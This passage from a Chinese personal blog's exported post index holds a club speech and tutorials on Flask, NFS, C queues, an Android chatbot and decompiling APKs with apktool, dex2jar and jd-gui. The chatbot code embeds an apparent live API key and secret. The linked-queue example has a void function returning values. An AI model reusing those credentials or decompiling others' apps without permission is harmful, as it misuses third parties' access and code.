    <url>%2F2016%2F10%2F23%2F%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%94%B5%E5%AD%90%E5%8D%8F%E4%BC%9A%E6%88%90%E7%AB%8B%E5%A4%A7%E4%BC%9A%E5%8F%91%E8%A8%80%2F</url>
    <content type="text"><![CDATA[时光飞逝，电子协会已经走到第三届，作为协会创办和发展的见证者，很高兴看到协会现在的样子，希望协会能够在第三届的带领下越办越好，也希望大家能够将协会的精神一届届地传承下去。我也很荣幸能够受邀作为第二届电子协会的代表在第三届成立大会上发言，以下是发言稿正文。 尊敬的各位领导、老师，亲爱的同学们，大家晚上好，我是13级信息工程3班的樊振宇，很荣幸能够作为第二届电子协会的代表在这里发言。时光飞逝，转眼一年又过去了，依稀记得第二届电子协会成立大会的场景，去年的成立大会比较简短，今年呢，我们第三届的理事们精心准备，付出了很多，所以也希望我能和大家多分享一点。其实呢，作为协会和实验室的老学长，我对这里已经有很深的感情，所以确实也有很多话想要和大家说。 首先，欢迎各位学弟学妹们加入电子协会这个大家庭，也祝贺第三届电子协会在今天成立。我自己是在大一下学期通过学院的实验室宣讲进入了电子设计创新实验室，那个时候电子协会还没有成立。刚进实验室的时候是12级电信2班的欧超学长带的我，他给我提供了很多帮助，也教会了我一些基本的技术，所以我一直也很感谢他。在这个实验室我不仅可以得到丰富的学习资源，还有热情的学长学姐们的指导和帮助，我当时就觉得这就是我理想的实验室。直到14年10月的时候，在实验室几位学长学姐的倡导下，成立了电子协会，成立的初衷也是积聚更多的电子人才，为实验室的发展打下良好的基础，因此，电子协会和电子设计创新实验室是一个有机的整体。 从我加入实验室，然后经历第一届、第二届电子协会的发展，再到今天第三届电子协会成立，这一路走来，我自己对于这个实验室和协会的发展也投入了很多的精力和感情，当然，在此期间，我也获得了技术与管理的双重成长，还结识了很多志同道合的朋友，这就是我在这里的一些收获。我也相信，如果大家也能够在协会和实验室一直坚持下去，等到你们大四的时候，一定也会有同样的收获和感触。 总结我的大学生活，实验室和协会是非常重要的一部分，也是非常精彩的一部分。深深地记得大二的那个暑假，参加全国电子设计大赛，虽有遗憾，但是一个暑假精心的准备，和指导老师一起四天三夜的连续奋斗至今还历历在目。大学里，你可能会和朋友去KTV通宵嗨唱，也可能会去网吧通宵游戏，但是你很难有机会和老师一起为了比赛而通宵奋斗。另外，我们实验室的小伙伴之间也建立了深厚的友谊，比如我们经常一起打球，有机会还会出去各种浪。总之，这里有学习有奋斗有工作有生活更有快乐，这就是我大学最难忘的实验室时光的一部分，这也是有青春、有活力的电子协会的一部分。虽然现在我们把接力棒交给了第三届的理事们，但是不管以后我们在哪里，我们也会像12级已经毕业的学长学姐们那样，始终关心支持实验室和协会的发展，希望协会的这些优秀的传统能够一届届传递下去。我想，这样一届一届的人才积淀，对于以后实验室和协会成员的考研、找工作或者是创业都会有所帮助，因为我们都来自于电子协会这个大家庭。 然后，作为第二届电子协会管理层的代表，我很高兴能够看到电子协会这一年取得的发展。这些成绩的取得来之不易，一方面，离不开实验室和协会各位指导老师的辛勤付出以及学院对我们的关心与支持，特别是匡老师的到来，给我们协会带来了很多实实在在的改变，在她的指导下很多制度都在不断完善，项目团队也在不断地充实，可以说整个实验室和协会的风气都在慢慢转变，另外王老师也加入到我们的团队中来了，相信我们的电子协会一定会发展得越来越顺利。另一方面，也离不开我们协会所有电子人不懈的努力，是大家夜以继日地奋斗，以及辛勤而无私的付出，才能够给实验室培养和输送这么多的人才，然后才能做出这么多的项目，去北京、上海、成都这些地方参加比赛并去的很不错的成绩。 最后，我想对第三届电子协会的管理人员说，我相信各位能够做得比我们第二届做得更好，也希望你们能够不忘初心，将这份积聚了几届电子人辛勤付出的事业更好地传承下去，我也衷心地希望第三届电子协会能够再创辉煌。我还想对第三届电子协会的所有学弟学妹们说，电子协会是一个很有活力的集体，有技术精湛而且负责任的指导老师，还有一群热情大方的学长学姐，相信这里将会是你技术梦想开始的地方，也希望大家能够一直坚持下来，最终顺利进入实验室，进行更深入的学习。 最后的最后，祝大家在电子协会都能有所收获，也祝愿电子协会能够越办越好。谢谢大家！ 2016年10月22日 湖南农业大学]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python Web开发框架Flask]]></title>
    <url>%2F2016%2F10%2F08%2FPython-Web%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6Flask%2F</url>
    <content type="text"><![CDATA[Flask是一个使用 Python 编写的轻量级 Web 应用框架。Flask 的设计目标是实现一个 wsgi 的微框架，其核心代码保持简单和可扩展性，很容易学习。Flask是一个易于学习和使用的框架，但是它的功能也是十分强大，后续还会有进一步的学习和总结，这是第一篇python Web的博客。 flask框架中文版开发文档：http://docs.jinkan.org/docs/flask/ Flask 依赖两个外部库：Werkzeug 和 Jinja2 。 Werkzeug 是一个 WSGI（在 Web 应用和多种服务器之间的标准 Python 接口) 工具集。Jinja2 负责渲染模板。 virtualenv – python虚拟沙盒virtualenv通过创建独立Python开发环境的工具, 来解决依赖、版本以及间接权限问题。 简单地说，你可以为每个项目建立不同的/独立的Python环境，你将为每个项目安装所有需要的软件包到它们各自独立的环境中。 安装virtualenv1$ pip install virtualenv 由于权限问题使用sudo临时提升权限 1$ sudo pip install virtualenv 建立并进入虚拟环境12$ mkdir myproject$ cd myproject 激活虚拟环境1$ . venv/bin/activate #激活当前virtualenv 测试（1）执行python程序 1$ sudo python Test.py （2）访问测试 通过浏览器访问如下地址：http://localhost:5000或者http://127.0.0.1:5000/，就可以看到Hello World！ （3）关闭服务器，按 Ctrl+C。 退出虚拟环境1$ deactivate 删除虚拟环境1$ rm -r venv 获取帮助1$ virtualenv -h Flask框架安装flask1$ pip install flask 基本框架（1）完整的Flask程序 123456789from flask import Flaskapp = Flask(__name__)@app.route(&apos;/&apos;)def hello_world(): return &apos;Hello World!&apos;if __name__ == &apos;__main__&apos;: app.run() （2）框架说明 12from flask import Flaskapp = Flask(__name__) 以上代码中首先导入了 Flask 类，并得到了该类的的实例app，这将会是我们的 WSGI 应用程序。 123@app.route(&apos;/&apos;)def hello_world(): return &apos;Hello World!&apos; 以上代码中route() 装饰器告诉Flask什么样的URL 能触发我们的函数。即route() 装饰器把一个函数绑定到对应的URL上，这个函数返回我们想要显示在用户浏览器中的信息。 12if __name__ == &apos;__main__&apos;: app.run() 以上代码中用 run() 函数来让应用运行在本地服务器上。其中 if name == ‘main‘: 确保服务器只会在该脚本被Python解释器直接执行的时候才会运行，而不是作为模块导入的时候。 调试模式启用了调试支持，服务器会在代码修改后自动重新载入，并在发生错误时提供一个相当有用的调试器。 有两种途径来启用调试模式。一种是直接在应用对象上设置: 12app.debug = Trueapp.run() 另一种是作为 run 方法的一个参数传入: 1app.run(debug=True) 路由配置route() 装饰器把一个函数绑定到对应的 URL 上。 123456789@app.route(&apos;/&apos;)def index(): return &apos;Index Page&apos;#通过http://127.0.0.1:5000访问@app.route(&apos;/hello&apos;)def hello(): return &apos;Hello World&apos;#通过http://127.0.0.1:5000/hello访问 可以给 URL 添加变量部分，你可以把这些特殊的字段标记为 ， 这个部分将会作为命名参数传递到你的函数。规则可以用 指定一个可选的转换器。 1234567891011@app.route(&apos;/user/&lt;username&gt;&apos;)def show_user_profile(username): return &apos;User %s&apos; % username#通过http://127.0.0.1:5000/user/加上名字访问@app.route(&apos;/post/&lt;int:post_id&gt;&apos;)def show_post(post_id): # show the post with the given id, the id is an integer return &apos;Post %d&apos; % post_id#通过http://127.0.0.1:5000/post/加上id访问 默认情况下，路由只回应 GET 请求，但是通过 route() 装饰器传递 methods 参数可以改变这个行为。 123456@app.route(&apos;/login&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])def login(): if request.method == &apos;POST&apos;: do_the_login() else: show_the_login_form() 关于HTTP协议的相关方法请参考博主博客：Android网络编程：HTTP协议 通过以上的学习对于Flask框架应该有了一个基本的认识，后续的博文中还将继续深入学习，敬请关注。]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Flask</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux NFS服务配置]]></title>
    <url>%2F2016%2F10%2F05%2FLinux-NFS%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。本博文记录了博主配置NFS服务的过程，并测试成功，希望对大家有所帮助。 注：本博客基于CentOS7进行测试，并假设你已经具有一定的Linux操作基础。 服务端配置安装必要的包使用NFS服务需要安装两个包：nfs-utils和rpcbind 1yum install -y nfs-utils 使用yum安装nfs-utils时会自动安装rpcbind 配置/etc/exports文件1vim /etc/exports 在配置文件中增加内容，每一行分为三部分： 本地要共享出去的目录 允许访问的主机（ip或ip段） 权限选项 例如写入如下一行： 1/home/fzy/ 192.168.0.1/24(rw,sync,all_squash,anonuid=501,anongid=501) 意思是：把/home/fzy/目录共享给ip地址为192.168.0.1/24的主机. 权限部分特别说明： rw 表示读/写 ro 表示只读 sync 表示数据同步写入内存缓冲区与磁盘中，效率较低，但可以保证数据的一致性（适合于小文件传输） async 表示数据先暂时放于内存，而非直接写入硬盘，等到必要时才写入磁盘（适合于大文件传输） no_root_squash 表示root用户对这个共享的目录拥有至高的控制权（不安全，不建议使用） root_squash 表示root用户对这个共享的目录的权限和普通用户一样。 all_squash 表示不管使用NFS的用户是谁，其身份都会被限定成一个指定的普通用户。 no_all_squash 表示所有的普通用户使用nfs都不使用权限压缩（默认设置） anonuid/anongid 要和root_squash以及all_squash选项一同使用，用于指定使用NFS的用户被限定后的uid和gid 启动NFS服务在启动nfs前，需先启动rpcbind 12# service rpcbind start# service nfs start 虽然上面的命令能够正常启动服务，但是根据提示，我们应该使用如下命令来替换： # /bin/systemctl start rpcbind.service # /bin/systemctl start nfs.service 关闭NFS服务 # /bin/systemctl stop rpcbind.service # /bin/systemctl stop nfs.service 客户端挂载NFS查看服务器共享的目录1# showmount -e 服务器ip地址 会得到如下的结果： 12Export list for 服务器ip地址:/home/fzy 客户端ip地址 在客户端上挂载NFS1# mount -t nfs 服务器ip地址:服务器共享目录 挂载点 其中-t nfs 指定挂载的类型为nfs 查看是否挂载成功命令df用于查看已挂载磁盘的总容量、使用容量、剩余容量等。 1# df -h -h 表示使用合适的单位显示 如下图： 解除挂载1# umount 已挂载的目录 如果遇到：umount.nfs: 已挂载的目录: device is busy 可以添加-l参数，如下： 1# umount -l 已挂载的目录 选项 –l 并不是马上umount，而是在该目录空闲后再umount，即延迟卸载。 开机自动挂载方法一： /etc/fstab里添加如下内容： 1服务器ip地址:共享的目录 客户端挂载点 nfs defaults 1 1 第1个1表示备份文件系统，第2个1表示从/分区的顺序开始fsck磁盘检测，0表示不检测. 方法二（推荐）： 将手动挂载命令加入到/etc/rc.local中. 命令exportfs命令选项 -a 表示全部挂载或者卸载 -r 表示重新挂载 -u 表示卸载某一目录 -v 表示显示共享的目录 使用命令修改配置文件/etc/exports后，使用exportfs命令挂载不需要重启NFS服务 1# exportfs -arv]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>NFS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android逆向分析之反编译]]></title>
    <url>%2F2016%2F10%2F03%2FAndroid%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91%2F</url>
    <content type="text"><![CDATA[如果你已经具备一定的Android开发基础，那你一定会思考别人的App是怎么做的，在使用一款App的时候也会想它这个布局、这个效果是怎么实现的？思考是好事，但是全靠猜可不行，如何拿到他的源代码呢？反编译的作用不言而喻。直接拿别人的源码确实不太道德，所以我们提倡学习借鉴，而不是复制。 使用工具： apktool（获取资源文件工具） apktool官方地址 dex2jar（获取源码文件工具） dex2jarGithub地址 jd-gui（源码查看工具） jd-gui官方地址 工具打包下载地址： 百度云链接：http://pan.baidu.com/s/1jHVHc4Q 密码：ra3u 注：以下操作需要你的电脑安装JDK，我们假设你已经安装了，并配置好了环境变量。 反编译得到资源文件apktool反编译得到程序的源代码、图片、XML配置、语言资源等文件 简单的使用如果你只需要简单的反编译，那下面这条命令已经能够满足你的需求。 在Windows下，使用cmd进入到下载的decompile文件夹，然后使用如下命令进行反编译： 1apktool.jar d apk文件路径 配置更多如果你需要使用带参数的apktool，体验更多的功能，或者你经常使用反编译，那建议你进行相应的配置。 将decompile文件夹下的apktool.jar和apktool.bat移动/复制到C:\Windows目录下(需要管理员权限)，如果不进行这一步，使用apktool命令时会提示：’apktool’不是内部或外部命令，也不是可运行的程序或批处理文件。 此处操作的原理就是将apktool的文件加入到环境变量中，因为C:\Windows已经在系统的环境变量中，所以复制到该文件夹后，apktool就成为了一个随处可用的命令。 比如使用apktool命令进行反编译： 1apktool d apk文件路径 apktool有如下参数可供使用： 123456789101112131415161718192021(1) -version 或者 --version 查看apktool版本信息(2) -advance 或者 --advanced 输出更详细的信息(3) d 或者 decode 反编译(4) b 或者 build 编译(5) -o 或者 --output &lt;dir&gt; apk反编译后输出到指定目录---------------------------以上较常用-----------------------------(6) -r 或者 --no-res 阻止反编译resource，不修改resources.arsc，若仅仅修改java（smail），建议使用该选项(7) -s 或者 --no-src 阻止dex文件分割，在build时仅仅移动classes.dex，若需要快速打包，建议使用该选项(8) -f 或者 --force-all 在打包时重写已经存在的文件，强制覆盖(9) -t 或者 --frame-tag &lt;TAG&gt; 给生成的framework文件打上标识(10) -p 或者 --frame-path &lt;dir&gt;指定framework文件储存的位置 使用apktool进行反编译之后可以得到android工程的res目录下的所有文件，以及AndroidManifest.xml，还有一个smali文件夹，很可惜，这个文件夹里的文件并不是java文件，而是很多smali格式的文件。如下图所示： 因为Android系统有自己的虚拟机Dalvik,代码编译最终不是采用的java的class，而是使用的smali。如果我们懂一点smali语法，那看懂这些文件也是不成问题的，但是我们有更好的办法，请看下一步。 Apk反编译得到Jar文件1、在windows下，使用cmd进入到下载的decomplie目录下的dex2jar文件夹 2、将apk文件改成rar后者zip文件，然后解压得到classes.dex文件 3、将解压得到的classes.dex文件复制到dex2jar文件夹内 4、使用如下命令得到classes-dex2jar.jar文件 1d2j-dex2jar.bat classes.dex文件的路径 在dex2jar文件夹可以看到生成了一个classes-dex2jar.jar的文件，然后通过下一步的工具即可查看项目java源码。 使用jar查看器查看源码打开下载的decompile文件夹中的jd-gui-windows-1.4.0目录下的jd-gui.exe，使用jd-gui打开上一步得到的jar文件即可看到项目的java源码，如下图所示： 此工具可用来查看jar文件，其实很多第三方的jar包也是可以通过此工具打开进行查看的。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,反编译］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android聊天机器人之图灵机器人]]></title>
    <url>%2F2016%2F09%2F22%2FAndroid%E8%81%8A%E5%A4%A9%E6%9C%BA%E5%99%A8%E4%BA%BA%E4%B9%8B%E5%9B%BE%E7%81%B5%E6%9C%BA%E5%99%A8%E4%BA%BA%2F</url>
    <content type="text"><![CDATA[图灵机器人—-中文语境下智能度最高的机器人大脑。之前写了一个有意思的小Demo，其实也比较简单，只是使用了图灵机器人的SDK来做了一个简单的聊天机器人，不过图灵机器人确实比较智能，而且功能十分丰富，它不仅提供了数据访问接口，还集成了SDK供大家使用，所以很方便很实用。如果无聊了，就自己动手来做一个聊天机器人解解闷吧！ 下载Android版本SDK图灵机器人官网：http://www.tuling123.com/ 注册之后创建机器人，就可以得到APIKEY和密钥，然后下载SDK，如下图： 将SDK添加到工程中将SDK压缩包中的libs文件夹复制到工程目录替换掉原来的libs。 添加权限1234567&lt;uses-permission android:name=&quot;android.permission.RECORD_AUDIO&quot; /&gt;&lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot; /&gt;&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;&lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot; /&gt;&lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot; /&gt;&lt;uses-permission android:name=&quot;android.permission.READ_CONTACTS&quot; /&gt;&lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot; /&gt; SDK初始化12345678910111213141516171819SDKInitBuilder builder = new SDKInitBuilder(this) .setSecret(TURING_SECRET).setTuringKey(TURING_APIKEY) .setUniqueId(UNIQUEID);SDKInit.init(builder, new InitListener() &#123; @Override public void onFail(String arg0) &#123; // TODO Auto-generated method stub &#125; @Override public void onComplete() &#123; // TODO Auto-generated method stub mTuringApiManager = new TuringApiManager(MainActivity.this); mTuringApiManager.setHttpListener(myHttpConnectionListener); // ttsManager.startTTS(&quot;你好啊&quot;); &#125;&#125;); 聊天机器人Demo实现的效果如下： 实现步骤： 定义消息实体类12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455public class ChatMessage &#123; private String name; //消息的名字 private String msg; //消息的内容 private Type type; //消息的类型 private Date date; //消息的时间 //消息类型：发送、接收 public enum Type &#123; INCOMING, OUTCOMING &#125; public ChatMessage() &#123; // TODO Auto-generated constructor stub &#125; public ChatMessage(String msg,Type type,Date date) &#123; // TODO Auto-generated constructor stub setMsg(msg); setType(type); setDate(date); &#125; //生成各成员属性的set和get方法 public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getMsg() &#123; return msg; &#125; public void setMsg(String msg) &#123; this.msg = msg; &#125; public Type getType() &#123; return type; &#125; public void setType(Type type) &#123; this.type = type; &#125; public Date getDate() &#123; return date; &#125; public void setDate(Date date) &#123; this.date = date; &#125;&#125; 编写适配器类使用适配器将数据与视图绑定起来。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485public class ChatMessageAdapter extends BaseAdapter &#123; private List&lt;ChatMessage&gt; mDatas; private Context mContext; //使用ViewHolder临时存储view，提高效率 private final class ViewHolder &#123; TextView mDate; TextView mMsg; &#125; public ChatMessageAdapter(Context context, List&lt;ChatMessage&gt; data) &#123; // TODO Auto-generated constructor stub mDatas = data; mContext = context; &#125; @Override public int getCount() &#123; // TODO Auto-generated method stub return mDatas.size(); &#125; @Override public Object getItem(int position) &#123; // TODO Auto-generated method stub return mDatas.get(position); &#125; @Override public long getItemId(int position) &#123; // TODO Auto-generated method stub return position; &#125; //得到布局的类型 @Override public int getItemViewType(int position) &#123; ChatMessage chatMessage = mDatas.get(position); if (chatMessage.getType() == Type.INCOMING) &#123; return 0; &#125; return 1; &#125; @Override public int getViewTypeCount() &#123; return 2; &#125; @Override public View getView(int position, View convertView, ViewGroup parent) &#123; // TODO Auto-generated method stub ViewHolder viewHolder = null; if (convertView == null) &#123; //更具不同的布局，加载不同的控件 if (getItemViewType(position) == 0) &#123; convertView = LayoutInflater.from(mContext).inflate( R.layout.item_from_msg, null); viewHolder = new ViewHolder(); viewHolder.mDate = (TextView) convertView .findViewById(R.id.id_form_msg_date); viewHolder.mMsg = (TextView) convertView .findViewById(R.id.id_from_msg_info); &#125; else &#123; convertView = LayoutInflater.from(mContext).inflate( R.layout.item_to_msg, null); viewHolder = new ViewHolder(); viewHolder.mDate = (TextView) convertView .findViewById(R.id.id_to_msg_date); viewHolder.mMsg = (TextView) convertView .findViewById(R.id.id_to_msg_info); &#125; convertView.setTag(viewHolder); //使用setTag把view缓存起来 &#125; else &#123; viewHolder = (ViewHolder) convertView.getTag(); //使用getTag得到view &#125; ChatMessage chatMessage = mDatas.get(position); // 设置数据 SimpleDateFormat df = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;); viewHolder.mDate.setText(df.format(chatMessage.getDate())); viewHolder.mMsg.setText(chatMessage.getMsg()); return convertView; &#125;&#125; 实现业务逻辑123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125public class MainActivity extends Activity &#123; /** * 申请的turing的apikey * **/ private final String TURING_APIKEY = &quot;56433fe6f67942ff80c4d7bd2d20fe34&quot;; /** * 申请的secret * **/ private final String TURING_SECRET = &quot;d9989eac6e4cab39&quot;; private final String UNIQUEID = &quot;131313131&quot;; private TuringApiManager mTuringApiManager; private ListView mMsgs; private ChatMessageAdapter mAdapter; private List&lt;ChatMessage&gt; mDatas; private EditText mInputMsg; private Button mSendMsg; //设置监听 HttpConnectionListener myHttpConnectionListener = new HttpConnectionListener() &#123; @Override public void onSuccess(RequestResult result) &#123; // TODO Auto-generated method stub if (result != null) &#123; String res = result.getContent().toString(); //获取服务器返回数据 System.out.println(res); JSONObject jo; try &#123; jo = new JSONObject(res); //解析JSON格式数据 String text = jo.getString(&quot;text&quot;); mDatas.add(new ChatMessage(text, Type.INCOMING, new Date())); mAdapter.notifyDataSetChanged(); //更新UI mMsgs.setSelection(mDatas.size()-1); &#125; catch (JSONException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125; &#125; @Override public void onError(ErrorMessage arg0) &#123; // TODO Auto-generated method stub &#125; &#125;; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); requestWindowFeature(Window.FEATURE_NO_TITLE); setContentView(R.layout.activity_main); //SDK初始化 SDKInitBuilder builder = new SDKInitBuilder(this) .setSecret(TURING_SECRET).setTuringKey(TURING_APIKEY) .setUniqueId(UNIQUEID); SDKInit.init(builder, new InitListener() &#123; @Override public void onFail(String arg0) &#123; // TODO Auto-generated method stub &#125; @Override public void onComplete() &#123; // TODO Auto-generated method stub mTuringApiManager = new TuringApiManager(MainActivity.this); mTuringApiManager.setHttpListener(myHttpConnectionListener); &#125; &#125;); initView(); //初始化视图 initDatas(); //初始化数据 //发送消息按钮的监听事件 mSendMsg.setOnClickListener(new OnClickListener() &#123; @Override public void onClick(View v) &#123; final String toMsg = mInputMsg.getText().toString(); if (TextUtils.isEmpty(toMsg)) &#123; Toast.makeText(MainActivity.this,&quot;发送消息不能为空！&quot;,Toast.LENGTH_SHORT).show(); return; &#125; //得到输入框的内容，转化成一个消息对象 ChatMessage toMessage = new ChatMessage(toMsg,Type.OUTCOMING,new Date()); mDatas.add(toMessage); mAdapter.notifyDataSetChanged(); mMsgs.setSelection(mDatas.size()-1); //清空输入框 mInputMsg.setText(&quot;&quot;); //发送消息到图灵服务器 mTuringApiManager.requestTuringAPI(toMsg); &#125; &#125;); &#125; //初始化数据 private void initDatas() &#123; mDatas = new ArrayList&lt;ChatMessage&gt;(); mDatas.add(new ChatMessage(&quot;你好，小农为您服务&quot;, Type.INCOMING, new Date())); mAdapter = new ChatMessageAdapter(this, mDatas); mMsgs.setAdapter(mAdapter); &#125; //初始化视图 private void initView() &#123; mMsgs = (ListView) findViewById(R.id.id_listview_msgs); mInputMsg = (EditText) findViewById(R.id.id_input_msg); mSendMsg = (Button) findViewById(R.id.id_send_msg); &#125;&#125;]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,图灵机器人］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据结构基础之队列]]></title>
    <url>%2F2016%2F09%2F08%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%9F%BA%E7%A1%80%E4%B9%8B%E9%98%9F%E5%88%97%2F</url>
    <content type="text"><![CDATA[上一篇博客中我们总结了栈的相关知识，其实，在数据结构的教材中栈和队列通常是放在同一章进行讲解的，因为他们都是操作受限的线性表，只是具体的限制不同。队列是只允许在表的一段进行插入操作，而在另一端进行删除操作的线性表，它的应用也是比较广泛的，比如在操作系统的处理进程对CPU资源的竞争以及我们常常提及的优先级队列等等。 队列的基本概念定义：只允许在表的一段进行插入操作，而在另一端进行删除操作的线性表。 队头：允许进行删除操作的一端。 队尾：允许进行插入操作的一端。 顺序队列 采用顺序存储结构，即在内存中用一组地址连续的存储单元一次存放从队头到队尾的数据元素，同时设置两个指针front、rear分别指示队头元素和队尾元素的位置。 1234typedef struct&#123; ElemType data[MAXSIZE]; //存放数据元素的数组 int front,rear; //头尾指针&#125;SeqQueue; 队头指针：指示队头元素所在位置。 队尾指针：指示队尾元素的下一个位置。 入队操作：rear = rear + 1 出队操作：front = front + 1 当rear = MAXSIZE时，队列不一定真的占满整个数组空间，因为不管入队还是出队指针都是加，头指针一直加就会使得数组的前端可能出现许多空的单元，这种现象称为假溢出。为了充分利用数组空间，于是引入了循环队列。 循环队列 将队列的存储空间看成一个环状的空间，即将队列的首、尾的位置连接起来形成的结构称为循环队列。 入队操作：Q-&gt;rear = (Q-&gt;rear + 1) % MAXSIZE 出队操作：Q-&gt;front = (Q-&gt;front + 1) % MAXSIZE 区分队空还是队满的方式1、牺牲一个单元来区分队空和队满，约定以队头指针在队尾指针的下一个位置作为队满的标志，则有： 队空条件：Q-&gt;front == Q-&gt;rear 队满条件：(Q-&gt;rear + 1) % MAXSIZE == Q-&gt;front 队列中元素个数：(Q-&gt;rear-Q-&gt;front+MAXSIZE) % MAXSIZE 2、类型中增设表示元素个数的数据成员，则有： 队空满条件：Q-&gt;size == 0 队满条件：Q-&gt;size == MAXSIZE 3、类型中增设tag数据成员，则有： tag等于0的情况下，若因删除导致Q-&gt;front == Q-&gt;rear则为队空，tag等于1的情况下，若因插入导致Q-&gt;front == Q-&gt;rear则为队满。 基本操作实现下面例子采用第一种处理方式： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define ElemType int#define false 0#define true 1#define MAXSIZE 100typedef struct&#123; ElemType data[MAXSIZE]; //存放数据元素的数组 int front,rear; //头尾指针&#125;SeqQueue;/*********初始化队列*********/void InitQueue(SeqQueue *Q)&#123; Q-&gt;front = Q-&gt;rear = 0;&#125;/*******判断队列是否为空*******/int QueueEmpty(SeqQueue *Q)&#123; if(Q-&gt;front == Q-&gt;rear) return true; else return false;&#125;/*************入队操作*************/int EnQueue(SeqQueue *Q,ElemType e)&#123; if((Q-&gt;rear+1)%MAXSIZE == Q-&gt;front) //队满 return false; Q-&gt;data[Q-&gt;rear] = e; //将e插入队尾 Q-&gt;rear = (Q-&gt;rear+1)%MAXSIZE; //修改尾指针 return true;&#125;/*************出队操作**************/int DeQueue(SeqQueue *Q,ElemType *e)&#123; if(Q-&gt;front == Q-&gt;rear) //队空 return false; *e = Q-&gt;data[Q-&gt;front]; //得到删除的队头元素 Q-&gt;front = (Q-&gt;front+1)%MAXSIZE; //修改头指针 return true;&#125;/*************取队头元素**************/int GetFront(SeqQueue *Q,ElemType *e)&#123; if(Q-&gt;front == Q-&gt;rear) //队空 return false; *e = Q-&gt;data[Q-&gt;front]; //取得队头元素 return true;&#125;int main()&#123; SeqQueue Q; InitQueue(&amp;Q); .... 进行入队、出队、判空等操作 .... return 0;&#125; 链式队列 采用链表形式的队列，队列中每个元素对应链表中的一个结点的，并设置两个分别指向队头和队尾的指针。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define ElemType int#define false 0#define true 1typedef struct LinkQNode&#123; ElemType data; //数据域 struct LinkQNode *next; //指针域&#125;LinkQNode;typedef struct&#123; LinkQNode *front; //队头指针 LinkQNode *rear; //队尾指针&#125;LinkQueue;/*********初始化队列*********/void InitQueue(LinkQueue *Q)&#123; LinkQNode *p = (LinkQNode *)malloc(sizeof(LinkQNode)); //构建头结点 if(p == NULL) //存储空间分配失败 return false; Q-&gt;front = Q-&gt;rear = p; //队头指针和队尾指针都指向头结点 Q-&gt;front-&gt;next = NULL; //头结点指针域至为空 return true;&#125;/*******判断队列是否为空*******/int QueueEmpty(LinkQueue *Q)&#123; if(Q-&gt;front == Q-&gt;rear) return true; else return false;&#125;/*************入队操作*************/int EnQueue(LinkQueue *Q,ElemType e)&#123; LinkQNode *p = (LinkQNode *)malloc(sizeof(LinkQNode)); //构建新结点 if(p == NULL) //存储空间分配失败 return false; p-&gt;data = e; //设置新结点数据域 p-&gt;next = NULL; //设置新结点指针域 Q-&gt;rear-&gt;next = p; //将新结点插入队尾 Q-&gt;rear = p; //修改队尾指针 return true;&#125;/*************出队操作**************/int DeQueue(LinkQueue *Q,ElemType *e)&#123; LinkQNode *p; if(Q-&gt;front == Q-&gt;rear) //队列空 return false; p = Q-&gt;front-&gt;next; //得到第一个结点 *e = p-&gt;data; //得到删除结点的值 Q-&gt;front-&gt;next = p-&gt;next; //结点p出队 if(Q-&gt;rear == p) //队列中只有一个结点p，则出队后队列为空 Q-&gt;rear = Q-&gt;front; free(p); //释放存储空间 return true;&#125;/*************取队头元素**************/int GetFront(LinkQueue *Q,ElemType *e)&#123; LinkQNode *p; if(Q-&gt;front == Q-&gt;rear) //队空 return false; p = Q-&gt;front-&gt;next; //得到第一个结点 *e = p-&gt;data; //得到第一个结点的值 return true;&#125;int main()&#123; LinkQueue Q; InitQueue(&amp;Q); .... 进行入队、出队、判空等操作 .... return 0;&#125; 双端队列 双端队列是指允许两端都可以进行入队和出队操作的队列。 输出受限的双端队列：允许在一端进行插入和删除，但在另一端只允许插入的双端队列。 输入受限的双端队列：允许在一端进行插入和删除，但在另一端只允许删除的双端队列。 尽管双端队列看起来似乎比栈和队列更灵活，但实际上在应用程序中远不及栈和队列有用，所以在这里就不详细的介绍啦！]]></content>
      <categories>
        <category>Data structure</category>
      </categories>
      <tags>
